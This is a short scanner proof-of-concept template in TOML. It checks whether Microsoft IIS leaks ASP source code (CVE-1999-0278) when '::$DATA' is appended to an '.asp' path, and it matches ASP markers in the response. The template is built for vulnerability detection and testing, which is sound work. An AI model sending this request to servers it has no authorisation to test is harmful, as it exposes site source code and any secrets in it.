[info]
author = "AVE"
description = "检测 Microsoft IIS 是否受 ASP 备用数据流源码泄露漏洞影响，通过附加 ::$DATA 路径后缀尝试获取 ASP 源码"
id = "POC-AVE-1999-0464"
name = "Microsoft IIS ASP ::$DATA 源码泄露漏洞 PoC"
severity = "medium"
tags = ["ave-1999-0464"]
vuln_id = [
    "CVE-1999-0278",
    "AVE-1999-0464",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/somefile.asp::$DATA"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<%",
    "Language=",
    "Response.",
]
